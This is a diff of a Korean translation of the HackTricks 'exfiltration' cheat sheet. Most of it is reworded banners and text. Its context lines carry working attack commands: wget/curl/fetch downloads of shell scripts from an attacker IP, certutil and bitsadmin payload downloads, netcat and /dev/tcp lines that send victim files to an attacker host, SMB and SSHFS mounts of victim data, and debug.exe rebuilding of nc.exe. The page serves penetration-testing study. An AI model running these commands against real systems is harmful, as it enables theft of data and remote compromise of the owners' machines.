@@ -1,30 +1,31 @@
 # 유출
 
+{% hint style="success" %}
+AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 영웅까지 AWS 해킹 배우기**!</summary>
+<summary>HackTricks 지원</summary>
 
-HackTricks를 지원하는 다른 방법:
-
-* **회사를 HackTricks에서 광고**하거나 **HackTricks를 PDF로 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
-* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **트위터** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
-* **해킹 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 제출하세요.
+* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
+* **해킹 트릭을 공유하려면 PR을 제출하여** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 기여하세요.**
 
 </details>
+{% endhint %}
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 ***
 
-## 정보 유출을 위한 일반적으로 화이트리스트에 등록된 도메인
+## 정보 유출을 위해 일반적으로 화이트리스트에 등록된 도메인
 
-[https://lots-project.com/](https://lots-project.com/)에서 남용될 수 있는 일반적으로 화이트리스트에 등록된 도메인을 찾으세요
+[https://lots-project.com/](https://lots-project.com/)에서 남용할 수 있는 일반적으로 화이트리스트에 등록된 도메인을 찾아보세요
 
 ## Base64 복사 및 붙여넣기
 
@@ -33,7 +34,7 @@ HackTricks를 지원하는 다른 방법:
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
-**윈도우**
+**Windows**
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
@@ -47,7 +48,7 @@ wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
-**윈도우**
+**Windows**
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
@@ -170,7 +171,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-또는 samba를 사용하여 smb 공유를 만듭니다:
+또는 **samba를 사용하여** smb 공유를 만듭니다:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -185,7 +186,7 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-윈도우 환경에서는 다양한 방법을 사용하여 데이터를 유출할 수 있습니다. 아래는 일반적인 데이터 유출 방법입니다.
+윈도우
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -201,13 +202,13 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-피해자가 SSH를 사용하고 있다면, 공격자는 피해자의 디렉토리를 공격자에게 마운트할 수 있습니다.
+피해자가 SSH를 가지고 있다면, 공격자는 피해자의 디렉토리를 공격자에게 마운트할 수 있습니다.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## 네트워크 채널
+## 네트워크 채널 (Network Channel)
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -220,9 +221,6 @@ nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
 ### 피해자에게 파일 업로드
-
-- 파일을 업로드하여 피해자 시스템으로 데이터를 전송할 수 있습니다.
-- 업로드된 파일은 다양한 방법으로 악용될 수 있으므로 주의해야 합니다.
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -257,7 +255,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-XP 및 2003에서는 기본적으로 활성화되어 있습니다 (다른 시스템에서는 설치 중 명시적으로 추가해야 함)
+기본적으로 XP 및 2003에서 (다른 시스템에서는 설치 중 명시적으로 추가해야 함)
 
 Kali에서 **TFTP 서버 시작**:
 ```bash
@@ -321,7 +319,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` 프로그램은 이진 파일을 검사하는 것뿐만 아니라 **16진수로부터 이진 파일을 재구성할 수 있는 능력**을 가지고 있습니다. 이는 `debug.exe`가 이진 파일을 생성할 수 있다는 것을 의미합니다. 그러나 중요한 점은 debug.exe가 **크기가 64 kb까지의 파일을 조립하는 제한**이 있다는 것입니다.
+`debug.exe` 프로그램은 이진 파일을 검사하는 것뿐만 아니라 **16진수로부터 이진 파일을 다시 만들 수 있는 능력**을 가지고 있습니다. 이는 `debug.exe`가 이진 파일을 생성할 수 있다는 것을 의미합니다. 그러나 중요한 점은 debug.exe가 **크기가 64 kb까지인 파일을 조립하는 데 제한이 있다**는 것입니다.
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -337,20 +335,21 @@ wine exe2bat.exe nc.exe nc.txt
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 AWS 해킹을 배우세요!</summary>
+<summary>HackTricks 지원</summary>
 
-HackTricks를 지원하는 다른 방법:
-
-* **회사가 HackTricks를 광고하길 원하거나 PDF로 다운로드하길 원한다면** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
-* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.
+* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
+* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃헙 레포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.
 
 </details>
+{% endhint %}
